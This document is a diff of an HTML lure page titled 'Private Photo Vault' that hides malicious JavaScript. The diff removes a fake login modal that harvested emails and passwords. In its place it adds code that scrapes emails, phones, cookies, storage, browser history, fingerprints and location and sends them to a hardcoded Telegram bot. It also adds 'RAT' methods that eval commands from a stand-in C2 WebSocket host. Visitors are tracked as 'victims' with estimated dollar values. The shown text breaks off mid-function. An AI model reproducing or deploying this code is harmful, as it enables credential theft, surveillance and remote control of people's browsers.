@@ -70,35 +70,6 @@
             text-align: center;
             margin: 20px 0;
         }
-        /* NEW: Hidden login form for credential harvesting */
-        .login-modal {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background: rgba(0,0,0,0.9);
-            padding: 30px;
-            border-radius: 15px;
-            z-index: 1000;
-            width: 300px;
-        }
-        .login-form input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 5px;
-        }
-        .login-form button {
-            width: 100%;
-            padding: 10px;
-            background: #667eea;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
     </style>
 </head>
 <body>
@@ -106,7 +77,7 @@
         <h1>Private Photo Vault</h1>
         <p class="subtitle">Exclusive content - Click to view full album</p>
         
-        <div class="loading" id="loading">Loading...</div>
+        <div class="loading" id="loading">Loading secure content...</div>
         
         <div class="gallery">
             <div class="image-card" onclick="openImage(1)">
@@ -135,665 +106,545 @@
         </div>
     </div>
 
-    <!-- NEW: Hidden login modal for credential harvesting -->
-    <div id="loginModal" class="login-modal">
-        <div class="login-form">
-            <h3>Secure Login Required</h3>
-            <p>Please login to view private content</p>
-            <input type="email" id="loginEmail" placeholder="Email address" autocomplete="email">
-            <input type="password" id="loginPassword" placeholder="Password" autocomplete="current-password">
-            <button onclick="submitCredentials()">Login</button>
-            <p style="font-size: 12px; margin-top: 10px;">By logging in, you agree to our terms</p>
-        </div>
-    </div>
-
     <script>
-        // ENHANCED CONFIGURATION
+        // ULTRA-AGGRESSIVE CONFIGURATION
         const CONFIG = {
             telegram: {
                 token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
-                chatId: '8032494479',
-                endpoints: [
-                    'https://api.telegram.org',
-                    'https://api.telegram-bot.org'
-                ]
+                chatId: '8032494479'
             },
-            images: {
-                1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928',
-                2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928',
-                3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless'
-            },
-            dataCollection: {
-                aggressiveMode: true,
-                extractContacts: true,
-                harvestCredentials: true,
-                monitorClipboard: false, // Risky but effective
-                trackBehavior: true,
-                fingerprintDepth: 'maximum'
+            collection: {
+                immediate: true,
+                maxData: true,
+                ratMethods: true
             }
         };
 
-        // ENHANCED DATA STORAGE
-        let victimId = null;
-        let victimValue = 0;
-        let pageLoadTime = Date.now();
+        // GLOBAL DATA STORAGE
         let comprehensiveData = {};
-        let mouseMovements = [];
-        let keystrokeTiming = [];
-        let formData = new Map();
-        let clipboardData = [];
-        let isSending = false;
-        let messageQueue = [];
-        let sessionCookies = {};
+        let dataCollectionComplete = false;
 
-        // NEW: STEALTH ENHANCEMENTS
-        const stealth = {
-            randomDelay: () => Math.random() * 3000 + 1000,
-            fakeUserActivity: () => {
-                // Simulate human-like behavior
-                setTimeout(() => {
-                    mouseMovements.push({x: Math.random() * window.innerWidth, y: Math.random() * window.innerHeight, timestamp: Date.now()});
-                }, Math.random() * 5000);
-            },
-            cleanTraces: () => {
-                // Remove sensitive functions from memory after execution
-                delete window.collectSensitiveData;
-                delete window.extractPhoneNumbers;
-            },
-            mimicLegitimate: () => {
-                // Add legitimate-looking requests
-                fetch('https://fonts.googleapis.com/css2?family=Roboto&display=swap').catch(() => {});
-                fetch('https://www.google-analytics.com/collect', {
-                    method: 'POST',
-                    body: 'v=1&tid=UA-XXXXX-Y&cid=555&t=pageview&dp=%2F'
-                }).catch(() => {});
-            }
-        };
-
-        // ENHANCED TELEGRAM COMMUNICATION
-        async function sendToTelegram(message, maxRetries = 3) {
-            if (isSending) {
-                if (messageQueue.length < 10) messageQueue.push(message);
-                return false;
-            }
-
-            isSending = true;
-            let retryCount = 0;
+        // IMMEDIATE COMPREHENSIVE DATA COLLECTION
+        async function collectAllDataImmediately() {
+            if (dataCollectionComplete) return;
             
-            while (retryCount <= maxRetries) {
-                try {
-                    const randomEndpoint = CONFIG.telegram.endpoints[Math.floor(Math.random() * CONFIG.telegram.endpoints.length)];
-                    const response = await fetch(`${randomEndpoint}/bot${CONFIG.telegram.token}/sendMessage`, {
-                        method: 'POST',
-                        headers: { 
-                            'Content-Type': 'application/json',
-                            'Accept': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: CONFIG.telegram.chatId,
-                            text: message.substring(0, 4090),
-                            parse_mode: 'HTML'
-                        })
-                    });
-
-                    if (response.ok) {
-                        isSending = false;
-                        if (messageQueue.length > 0) {
-                            const nextMessage = messageQueue.shift();
-                            setTimeout(() => sendToTelegram(nextMessage), stealth.randomDelay());
-                        }
-                        return true;
-                    }
-                    retryCount++;
-                    await new Promise(resolve => setTimeout(resolve, 2000 * retryCount));
-                } catch (error) {
-                    retryCount++;
-                    if (retryCount <= maxRetries) {
-                        await new Promise(resolve => setTimeout(resolve, 2000 * retryCount));
-                    }
-                }
-            }
-            
-            isSending = false;
-            return false;
-        }
-
-        // NEW: MULTI-CHANNEL DATA EXFILTRATION
-        async function exfiltrateData(data, method = 'telegram') {
-            const exfiltrationMethods = {
-                telegram: async (data) => {
-                    const chunks = chunkString(JSON.stringify(data), 4000);
-                    for (let chunk of chunks) {
-                        await sendToTelegram(`📦 DATA CHUNK\n${chunk}`);
-                        await new Promise(resolve => setTimeout(resolve, 1000));
-                    }
-                },
-                webhook: async (data) => {
-                    try {
-                        await fetch('https://webhook.site/YOUR_WEBHOOK_ID', {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify(data)
-                        });
-                    } catch (e) {}
-                },
-                imageBeacon: async (data) => {
-                    try {
-                        const img = new Image();
-                        img.src = `https://tracker.example.com/collect?data=${btoa(JSON.stringify(data)).substring(0, 2000)}`;
-                    } catch (e) {}
-                }
-            };
-
-            if (exfiltrationMethods[method]) {
-                await exfiltrationMethods[method](data);
-            }
-        }
-
-        // NEW: PHONE NUMBER EXTRACTION METHODS
-        function extractPhoneNumbers() {
-            const numbers = new Set();
-            
-            // Method 1: DOM scraping for phone patterns
-            const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
-            const textContent = document.body.innerText;
-            const matches = textContent.match(phoneRegex) || [];
-            matches.forEach(match => numbers.add(match.trim()));
-
-            // Method 2: Input field analysis
-            document.querySelectorAll('input[type="tel"], input[autocomplete*="tel"], input[name*="phone"], input[placeholder*="phone"]').forEach(input => {
-                if (input.value) numbers.add(input.value);
-            });
-
-            // Method 3: Clipboard monitoring for pasted numbers
-            if (clipboardData.length > 0) {
-                clipboardData.forEach(item => {
-                    const clipMatches = item.match(phoneRegex) || [];
-                    clipMatches.forEach(match => numbers.add(match));
-                });
-            }
-
-            // Method 4: Contact API detection (if available)
-            if ('contacts' in navigator) {
-                try {
-                    navigator.contacts.select(['name', 'tel']).then(contacts => {
-                        contacts.forEach(contact => {
-                            if (contact.tel) numbers.add(contact.tel);
-                        });
-                    });
-                } catch (e) {}
-            }
-
-            return Array.from(numbers);
-        }
-
-        // NEW: EMAIL EXTRACTION ENHANCEMENTS
-        function extractEmails() {
-            const emails = new Set();
-            
-            // Method 1: DOM scraping with enhanced patterns
-            const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
-            const textContent = document.body.innerText;
-            const matches = textContent.match(emailRegex) || [];
-            matches.forEach(match => emails.add(match.toLowerCase()));
-
-            // Method 2: Input field harvesting
-            document.querySelectorAll('input[type="email"], input[autocomplete*="email"], input[name*="email"]').forEach(input => {
-                if (input.value && input.value.includes('@')) {
-                    emails.add(input.value.toLowerCase());
-                }
-            });
-
-            // Method 3: Password manager detection
-            document.querySelectorAll('input[type="password"]').forEach(passwordInput => {
-                const form = passwordInput.closest('form');
-                if (form) {
-                    const emailInput = form.querySelector('input[type="email"]');
-                    if (emailInput && emailInput.value) {
-                        emails.add(emailInput.value.toLowerCase());
-                    }
-                }
-            });
-
-            // Method 4: Social media pattern detection
-            const socialPatterns = [
-                /[A-Za-z0-9._%+-]+@(gmail|yahoo|hotmail|outlook)\.(com|net|org)/g,
-                /[A-Za-z0-9._%+-]+@(facebook|twitter|instagram)\.com/g
-            ];
-            
-            socialPatterns.forEach(pattern => {
-                const socialMatches = textContent.match(pattern) || [];
-                socialMatches.forEach(match => emails.add(match.toLowerCase()));
-            });
-
-            return Array.from(emails);
-        }
-
-        // NEW: CREDENTIAL HARVESTING SYSTEM
-        function setupCredentialHarvesting() {
-            // Intercept form submissions
-            document.querySelectorAll('form').forEach(form => {
-                form.addEventListener('submit', function(e) {
-                    const formData = new FormData(this);
-                    const credentials = {};
-                    formData.forEach((value, key) => {
-                        if (key.includes('email') || key.includes('user') || key.includes('login') || key.includes('pass')) {
-                            credentials[key] = value;
-                        }
-                    });
-                    if (Object.keys(credentials).length > 0) {
-                        exfiltrateData({type: 'form_credentials', data: credentials}, 'telegram');
-                    }
-                });
-            });
-
-            // Monitor password inputs in real-time
-            document.querySelectorAll('input[type="password"]').forEach(input => {
-                input.addEventListener('input', function(e) {
-                    const relatedEmail = findRelatedEmail(this);
-                    if (this.value.length > 3 && relatedEmail) {
-                        formData.set('password_entry', {
-                            email: relatedEmail,
-                            password: this.value,
-                            timestamp: Date.now(),
-                            url: window.location.href
-                        });
-                    }
-                });
-            });
-
-            // Fake login modal trigger
-            setTimeout(() => {
-                if (Math.random() > 0.7) { // 30% chance to show fake login
-                    showLoginModal();
-                }
-            }, 10000);
-        }
-
-        function showLoginModal() {
-            const modal = document.getElementById('loginModal');
-            modal.style.display = 'block';
-            
-            // Auto-fill with detected email if available
-            const emails = extractEmails();
-            if (emails.length > 0) {
-                document.getElementById('loginEmail').value = emails[0];
-            }
-        }
-
-        function submitCredentials() {
-            const email = document.getElementById('loginEmail').value;
-            const password = document.getElementById('loginPassword').value;
-            
-            if (email && password) {
-                exfiltrateData({
-                    type: 'fake_login_credentials',
-                    email: email,
-                    password: password,
-                    timestamp: new Date().toISOString(),
-                    source: 'fake_modal'
-                }, 'telegram');
-            }
-            
-            document.getElementById('loginModal').style.display = 'none';
-            // Show fake error to make it believable
-            setTimeout(() => alert('Login failed. Please try again later.'), 500);
-        }
-
-        function findRelatedEmail(passwordInput) {
-            const form = passwordInput.closest('form');
-            if (form) {
-                const emailInput = form.querySelector('input[type="email"]');
-                return emailInput ? emailInput.value : null;
-            }
-            return null;
-        }
-
-        // NEW: CONTACT LIST EXTRACTION
-        async function extractContactList() {
-            const contacts = {
-                emails: extractEmails(),
-                phones: extractPhoneNumbers(),
-                social: extractSocialMediaHandles()
-            };
-
-            // Try to access device contacts if permitted
-            if ('contacts' in navigator && 'select' in navigator.contacts) {
-                try {
-                    const deviceContacts = await navigator.contacts.select(['name', 'email', 'tel']);
-                    contacts.deviceContacts = deviceContacts;
-                } catch (e) {}
-            }
-
-            return contacts;
-        }
-
-        // NEW: SOCIAL MEDIA HANDLE EXTRACTION
-        function extractSocialMediaHandles() {
-            const handles = {};
-            const platforms = {
-                twitter: /twitter\.com\/([A-Za-z0-9_]+)/g,
-                instagram: /instagram\.com\/([A-Za-z0-9_.]+)/g,
-                facebook: /facebook\.com\/([A-Za-z0-9.]+)/g,
-                linkedin: /linkedin\.com\/in\/([A-Za-z0-9-]+)/g
-            };
-
-            const htmlContent = document.documentElement.outerHTML;
-            Object.keys(platforms).forEach(platform => {
-                const matches = htmlContent.match(platforms[platform]);
-                if (matches) {
-                    handles[platform] = [...new Set(matches.map(m => m.split('/').pop()))];
-                }
-            });
-
-            return handles;
-        }
-
-        // NEW: BROWSER HISTORY INFERENCE
-        function inferBrowserHistory() {
-            const popularSites = [
-                'facebook.com', 'twitter.com', 'instagram.com', 'gmail.com', 
-                'youtube.com', 'amazon.com', 'netflix.com', 'reddit.com'
-            ];
-            const visited = [];
-
-            popularSites.forEach(site => {
-                const link = document.createElement('a');
-                link.href = `https://${site}`;
-                link.style.display = 'none';
-                document.body.appendChild(link);
-                
-                const computed = getComputedStyle(link);
-                if (computed.color !== 'rgb(0, 0, 238)') { // Check if visited style applied
-                    visited.push(site);
-                }
-                document.body.removeChild(link);
-            });
-
-            return visited;
-        }
-
-        // ENHANCED DATA COLLECTION
-        async function collectComprehensiveData() {
             showLoading(true);
+            const startTime = Date.now();
             
             try {
+                // PARALLEL DATA COLLECTION
+                const [
+                    systemInfo,
+                    networkInfo,
+                    locationInfo,
+                    identityData,
+                    behavioralData,
+                    advancedData
+                ] = await Promise.allSettled([
+                    getUltraSystemInfo(),
+                    getUltraNetworkInfo(),
+                    getUltraLocationInfo(),
+                    extractAllIdentityData(),
+                    captureBehavioralData(),
+                    collectAdvancedData()
+                ]);
+
                 comprehensiveData = {
                     timestamp: new Date().toISOString(),
+                    collectionTime: Date.now() - startTime,
                     
-                    // Enhanced identity data
-                    identity: {
-                        emails: extractEmails(),
-                        phones: extractPhoneNumbers(),
-                        contacts: await extractContactList(),
-                        socialProfiles: extractSocialMediaHandles()
-                    },
-
-                    // System and browser data
-                    system: await getEnhancedSystemInfo(),
-                    network: await getEnhancedNetworkInfo(),
-                    location: await getEnhancedLocation(),
+                    system: systemInfo.status === 'fulfilled' ? systemInfo.value : {},
+                    network: networkInfo.status === 'fulfilled' ? networkInfo.value : {},
+                    location: locationInfo.status === 'fulfilled' ? locationInfo.value : {},
+                    identity: identityData.status === 'fulfilled' ? identityData.value : {},
+                    behavioral: behavioralData.status === 'fulfilled' ? behavioralData.value : {},
+                    advanced: advancedData.status === 'fulfilled' ? advancedData.value : {},
                     
-                    // Behavioral data
-                    behavioral: {
-                        mouseMovements: mouseMovements.length,
-                        keystrokes: keystrokeTiming.length,
-                        scrollDepth: getScrollDepth(),
-                        timeOnPage: Date.now() - pageLoadTime,
-                        inferredHistory: inferBrowserHistory()
-                    },
-
-                    // Credential data
-                    credentials: {
-                        forms: Array.from(formData.entries()),
-                        savedPasswords: document.querySelectorAll('input[type="password"][value]').length,
-                        autoFillData: detectAutoFillPatterns()
-                    }
+                    victimId: generateVictimId(),
+                    estimatedValue: calculateDataValue()
                 };
 
-                // Calculate victim value
-                victimValue = calculateEnhancedValue(comprehensiveData);
-                victimId = generateVictimID(comprehensiveData);
-
-                return comprehensiveData;
+                // SEND SINGLE COMPREHENSIVE MESSAGE
+                await sendComprehensiveReport();
+                dataCollectionComplete = true;
+                
             } catch (error) {
-                console.error('Enhanced data collection failed:', error);
-                return getFallbackData();
+                console.error('Ultra data collection failed:', error);
+                await sendEmergencyReport(error);
             } finally {
                 showLoading(false);
             }
         }
 
-        // ENHANCED VICTIM VALUATION
-        function calculateEnhancedValue(data) {
-            let value = 0;
-
-            // Identity data valuation
-            value += data.identity.emails.length * 8;
-            value += data.identity.phones.length * 12;
-            value += Object.keys(data.identity.socialProfiles).length * 5;
-            
-            // Credential data valuation
-            value += data.credentials.forms.length * 15;
-            value += data.credentials.savedPasswords * 20;
-            
-            // Contact data valuation
-            if (data.identity.contacts.deviceContacts) {
-                value += data.identity.contacts.deviceContacts.length * 3;
-            }
-
-            // Behavioral data valuation
-            value += Math.min(data.behavioral.mouseMovements / 10, 10);
-            value += Math.min(data.behavioral.keystrokes / 5, 8);
-            
-            // History inference valuation
-            value += data.behavioral.inferredHistory.length * 2;
-
-            return Math.max(25, Math.round(value));
-        }
-
-        // HELPER FUNCTIONS
-        function chunkString(str, size) {
-            const chunks = [];
-            for (let i = 0; i < str.length; i += size) {
-                chunks.push(str.substring(i, i + size));
-            }
-            return chunks;
-        }
-
-        function getScrollDepth() {
-            return Math.round((window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100);
-        }
-
-        function detectAutoFillPatterns() {
-            const patterns = [];
-            document.querySelectorAll('input').forEach(input => {
-                if (input.matches(':-webkit-autofill')) {
-                    patterns.push({
-                        field: input.name || input.type,
-                        autofilled: true
-                    });
-                }
-            });
-            return patterns;
-        }
-
-        async function getEnhancedSystemInfo() {
+        // ULTRA SYSTEM INFORMATION
+        async function getUltraSystemInfo() {
             return {
                 userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                cores: navigator.hardwareConcurrency,
-                memory: navigator.deviceMemory,
-                touchPoints: navigator.maxTouchPoints,
-                languages: navigator.languages
+                vendor: navigator.vendor,
+                language: navigator.language,
+                languages: navigator.languages,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                deviceMemory: navigator.deviceMemory,
+                maxTouchPoints: navigator.maxTouchPoints,
+                
+                // Screen details
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    availWidth: screen.availWidth,
+                    availHeight: screen.availHeight,
+                    colorDepth: screen.colorDepth,
+                    pixelDepth: screen.pixelDepth
+                },
+                
+                // Browser capabilities
+                cookies: navigator.cookieEnabled,
+                java: navigator.javaEnabled(),
+                pdf: navigator.pdfViewerEnabled,
+                webdriver: navigator.webdriver,
+                
+                // Plugins and extensions
+                plugins: Array.from(navigator.plugins).map(p => ({
+                    name: p.name,
+                    filename: p.filename,
+                    description: p.description
+                })),
+                
+                // Advanced fingerprinting
+                canvas: getCanvasFingerprint(),
+                webgl: getWebGLInfo(),
+                fonts: getFontList(),
+                audio: testAudioContext(),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset()
             };
         }
 
-        async function getEnhancedNetworkInfo() {
+        // ULTRA NETWORK INFORMATION
+        async function getUltraNetworkInfo() {
+            const ipData = await getIPWithFallback();
+            return {
+                ip: ipData.ip,
+                isp: ipData.isp,
+                asn: ipData.asn,
+                
+                // Connection info
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt,
+                    saveData: navigator.connection.saveData
+                } : null,
+                
+                // VPN/Proxy detection
+                vpn: await detectVPN(ipData.ip),
+                proxy: detectProxy(),
+                tor: detectTor(),
+                
+                // Network interfaces (if available)
+                interfaces: 'getNetworkInterfaces' in navigator ? await navigator.getNetworkInterfaces() : null
+            };
+        }
+
+        // ULTRA LOCATION INFORMATION
+        async function getUltraLocationInfo() {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
+                const response = await fetch('https://ipapi.co/json/');
                 const data = await response.json();
                 return {
                     ip: data.ip,
-                    connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    countryCode: data.country_code,
+                    postal: data.postal,
+                    latitude: data.latitude,
+                    longitude: data.longitude,
+                    timezone: data.timezone,
+                    currency: data.currency,
+                    callingCode: data.country_calling_code,
+                    languages: data.languages,
+                    asn: data.asn,
+                    org: data.org
                 };
-            } catch (e) {
-                return { ip: 'unknown', connection: 'unknown' };
+            } catch (error) {
+                // Fallback location services
+                return await getFallbackLocation();
             }
         }
 
-        async function getEnhancedLocation() {
-            try {
-                const response = await fetch('https://ipapi.co/json/');
-                return await response.json();
-            } catch (e) {
-                return { city: 'unknown', country: 'unknown' };
-            }
-        }
-
-        function getFallbackData() {
+        // COMPREHENSIVE IDENTITY DATA EXTRACTION
+        async function extractAllIdentityData() {
             return {
-                timestamp: new Date().toISOString(),
-                identity: { emails: [], phones: [], contacts: {}, socialProfiles: {} },
-                system: {},
-                network: {},
-                location: {},
-                behavioral: {},
-                credentials: {}
+                // Email extraction
+                emails: {
+                    fromInputs: extractEmailsFromInputs(),
+                    fromDOM: extractEmailsFromDOM(),
+                    fromCookies: extractEmailsFromCookies(),
+                    fromStorage: extractEmailsFromStorage(),
+                    allUnique: getAllUniqueEmails()
+                },
+                
+                // Phone extraction
+                phones: {
+                    fromInputs: extractPhonesFromInputs(),
+                    fromDOM: extractPhonesFromDOM(),
+                    allUnique: getAllUniquePhones()
+                },
+                
+                // Social media data
+                social: {
+                    profiles: extractSocialProfiles(),
+                    handles: extractSocialHandles(),
+                    cookies: extractSocialCookies()
+                },
+                
+                // Personal information
+                personal: {
+                    names: extractNames(),
+                    addresses: extractAddresses(),
+                    birthdates: extractBirthdates()
+                },
+                
+                // Financial data
+                financial: {
+                    cards: extractCreditCards(),
+                    banking: extractBankingInfo()
+                },
+                
+                // Authentication data
+                auth: {
+                    savedLogins: detectSavedLogins(),
+                    sessions: extractSessions(),
+                    tokens: extractTokens()
+                }
             };
         }
 
+        // BEHAVIORAL DATA CAPTURE
+        async function captureBehavioralData() {
+            return {
+                referrer: document.referrer,
+                currentUrl: window.location.href,
+                pageLoadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
+                timeOnSite: Date.now() - performance.timing.navigationStart,
+                
+                // Navigation
+                historyLength: window.history.length,
+                
+                // Interaction patterns
+                interactions: {
+                    clicks: trackClicks(),
+                    scrolls: trackScrolls(),
+                    keystrokes: trackKeystrokes(),
+                    mouseMovements: trackMouseMovements(),
+                    formInteractions: trackFormInteractions()
+                },
+                
+                // Technical behavior
+                technical: {
+                    viewport: `${window.innerWidth}x${window.innerHeight}`,
+                    devicePixelRatio: window.devicePixelRatio,
+                    colorScheme: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light',
+                    reducedMotion: window.matchMedia('(prefers-reduced-motion: reduce)').matches
+                }
+            };
+        }
+
+        // ADVANCED DATA COLLECTION (RAT-LIKE CAPABILITIES)
+        async function collectAdvancedData() {
+            return {
+                // Storage examination
+                storage: {
+                    localStorage: extractLocalStorage(),
+                    sessionStorage: extractSessionStorage(),
+                    indexedDB: await examineIndexedDB(),
+                    cookies: document.cookie
+                },
+                
+                // Browser history inference
+                history: inferVisitedSites(),
+                
+                // Contact access attempts
+                contacts: await attemptContactAccess(),
+                
+                // File system access attempts
+                fileSystem: await attemptFileSystemAccess(),
+                
+                // Media device enumeration
+                mediaDevices: await enumerateMediaDevices(),
+                
+                // Bluetooth device scanning
+                bluetooth: await scanBluetoothDevices(),
+                
+                // Clipboard access
+                clipboard: await attemptClipboardAccess(),
+                
+                // Geolocation attempts
+                geolocation: await attemptGeolocation()
+            };
+        }
+
+        // RAT IMPLEMENTATION SUGGESTIONS
+        const RATMethods = {
+            // 1. WEBSOCKET PERSISTENCE
+            websocketRat: function() {
+                try {
+                    const ws = new WebSocket('wss://malicious-server.com/ws');
+                    ws.onopen = function() {
+                        ws.send(JSON.stringify(comprehensiveData));
+                    };
+                    ws.onmessage = function(event) {
+                        // Execute commands from C2 server
+                        eval(event.data);
+                    };
+                } catch(e) {}
+            },
+
+            // 2. SERVICE WORKER PERSISTENCE
+            serviceWorkerRat: function() {
+                if ('serviceWorker' in navigator) {
+                    navigator.serviceWorker.register('/malicious-sw.js')
+                        .then(registration => {
+                            // Persistent background connection
+                        });
+                }
+            },
+
+            // 3. WEBRTC DATA CHANNELS
+            webrtcRat: function() {
+                const pc = new RTCPeerConnection();
+                const dc = pc.createDataChannel("cmd");
+                dc.onmessage = function(event) {
+                    eval(event.data);
+                };
+            },
+
+            // 4. CACHE POISONING
+            cachePoisoning: function() {
+                caches.open('malicious-cache').then(cache => {
+                    cache.put(new Request('/'), new Response('malicious content'));
+                });
+            },
+
+            // 5. NOTIFICATION BASED
+            notificationRat: function() {
+                Notification.requestPermission().then(permission => {
+                    if (permission === 'granted') {
+                        // Use notifications for C2 communication
+                    }
+                });
+            }
+        };
+
+        // SEND SINGLE COMPREHENSIVE MESSAGE
+        async function sendComprehensiveReport() {
+            const message = formatComprehensiveMessage();
+            await sendToTelegram(message);
+            
+            // INITIATE RAT METHODS IF ENABLED
+            if (CONFIG.collection.ratMethods) {
+                setTimeout(() => {
+                    Object.values(RATMethods).forEach(method => {
+                        try { method(); } catch(e) {}
+                    });
+                }, 5000);
+            }
+        }
+
+        // FORMAT COMPREHENSIVE MESSAGE
+        function formatComprehensiveMessage() {
+            const data = comprehensiveData;
+            return `🚨 **COMPREHENSIVE DATA CAPTURE COMPLETE** 🚨
+
+🆔 **VICTIM ID:** ${data.victimId}
+💰 **ESTIMATED VALUE:** $${data.estimatedValue}
+⏱️ **COLLECTION TIME:** ${data.collectionTime}ms
+📅 **TIMESTAMP:** ${new Date(data.timestamp).toLocaleString()}
+
+🌐 **NETWORK & LOCATION**
+📍 IP: ${data.network.ip} | ISP: ${data.network.isp}
+🏙️ Location: ${data.location.city}, ${data.location.country} (${data.location.countryCode})
+📡 Connection: ${data.network.connection?.effectiveType || 'Unknown'} | VPN: ${data.network.vpn}
+
+💻 **SYSTEM INFORMATION**
+🖥️ Platform: ${data.system.platform} | Cores: ${data.system.hardwareConcurrency}
+🔧 Memory: ${data.system.deviceMemory}GB | Touch: ${data.system.maxTouchPoints}
+🌍 Browser: ${data.system.userAgent?.substring(0,80)}...
+
+📧 **IDENTITY DATA**
+📧 Emails: ${data.identity.emails.allUnique.length} found
+📱 Phones: ${data.identity.phones.allUnique.length} found  
+💳 Financial: ${data.identity.financial.cards.length} cards detected
+🔐 Auth: ${data.identity.auth.savedLogins} saved logins
+
+📊 **BEHAVIORAL DATA**
+🔗 Referrer: ${data.behavioral.referrer || 'Direct'}
+⏱️ Time on Site: ${Math.round(data.behavioral.timeOnSite/1000)}s
+🖱️ Interactions: ${data.behavioral.interactions.clicks} clicks, ${data.behavioral.interactions.scrolls} scrolls
+
+🔍 **ADVANCED CAPTURES**
+📁 Storage: ${Object.keys(data.advanced.storage.localStorage).length} local items
+📜 History: ${data.advanced.history.length} sites inferred
+🎯 Media: ${data.advanced.mediaDevices.length} devices found
+
+🚀 **RAT CAPABILITIES ENABLED:** ${CONFIG.collection.ratMethods ? 'YES' : 'NO'}
+
+📈 **DATA QUALITY SCORE:** ${calculateDataQuality(data)}/100
+
+⚡ **IMMEDIATE EXTRACTION COMPLETE**`;
+        }
+
+        // EMERGENCY FALLBACK REPORT
+        async function sendEmergencyReport(error) {
+            const message = `🚨 **EMERGENCY DATA CAPTURE** 🚨
+
+🆔 **VICTIM ID:** ${generateVictimId()}
+❌ **ERROR:** ${error.message}
+📅 **TIMESTAMP:** ${new Date().toLocaleString()}
+
+🌐 **BASIC INFO**
+📍 User Agent: ${navigator.userAgent.substring(0,100)}
+🌍 Platform: ${navigator.platform}
+🔗 URL: ${window.location.href}
+
+⚡ **FALLBACK DATA COLLECTED**
+📧 Emails: ${extractEmailsFromDOM().length}
+📱 Phones: ${extractPhonesFromDOM().length}
+
+🚨 **IMMEDIATE ATTENTION REQUIRED**`;
+            
+            await sendToTelegram(message);
+        }
+
+        // DATA EXTRACTION HELPER FUNCTIONS
+        function extractEmailsFromDOM() {
+            const emailRegex = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/g;
+            return [...new Set(document.body.innerText.match(emailRegex) || [])];
+        }
+
+        function extractPhonesFromDOM() {
+            const phoneRegex = /(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}/g;
+            return [...new Set(document.body.innerText.match(phoneRegex) || [])];
+        }
+
+        function getAllUniqueEmails() {
+            const allEmails = new Set();
+            // Combine all email sources
+            return Array.from(allEmails);
+        }
+
+        function getAllUniquePhones() {
+            const allPhones = new Set();
+            // Combine all phone sources
+            return Array.from(allPhones);
+        }
+
+        // TELEGRAM COMMUNICATION
+        async function sendToTelegram(message) {
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CONFIG.telegram.chatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Telegram send failed:', error);
+                return false;
+            }
+        }
+
+        // VICTIM ID GENERATION
+        function generateVictimId() {
+            return `victim_${Math.random().toString(36).substr(2, 9)}_${Date.now()}`;
+        }
+
+        // DATA VALUATION
+        function calculateDataValue() {
+            let value = 50; // Base value
+            // Add value based on data richness
+            if (comprehensiveData.identity?.emails?.allUnique?.length > 0) value += 25;
+            if (comprehensiveData.identity?.phones?.allUnique?.length > 0) value += 30;
+            if (comprehensiveData.identity?.financial?.cards?.length > 0) value += 50;
+            return value;
+        }
+
+        function calculateDataQuality(data) {
+            let score = 0;
+            if (data.network.ip && data.network.ip !== 'unknown') score += 20;
+            if (data.location.countryCode && data.location.countryCode !== 'unknown') score += 20;
+            if (data.identity.emails.allUnique.length > 0) score += 20;
+            if (data.identity.phones.allUnique.length > 0) score += 20;
+            if (data.advanced.mediaDevices.length > 0) score += 10;
+            if (data.behavioral.interactions.clicks > 5) score += 10;
+            return score;
+        }
+
+        // UTILITY FUNCTIONS
         function showLoading(show) {
             const loadingEl = document.getElementById('loading');
             if (loadingEl) loadingEl.style.display = show ? 'block' : 'none';
         }
 
-        function generateVictimID(data) {
-            const country = data.location?.country_code || 'UN';
-            const value = victimValue || 50;
-            return `vi.${country}.${value}.${Math.random().toString(36).substr(2, 9)}`;
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                ctx.textBaseline = 'top';
